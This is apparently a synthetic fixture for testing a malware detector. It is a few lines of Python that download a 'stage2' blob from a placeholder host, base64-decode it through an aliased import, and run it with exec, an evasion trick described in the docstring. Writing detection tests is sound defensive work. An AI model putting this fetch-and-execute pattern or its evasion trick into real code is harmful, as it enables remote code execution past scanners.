# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Evasion variant: base64 imported under a module ALIAS so the decode call reads `b.b64decode`.
A naive `base64.b64decode` matcher misses this; the decoded payload is fetched (non-literal)."""
import base64 as b
import urllib.request as u

_blob = u.urlopen("http://drop.invalid/stage2").read()
exec(b.b64decode(_blob))
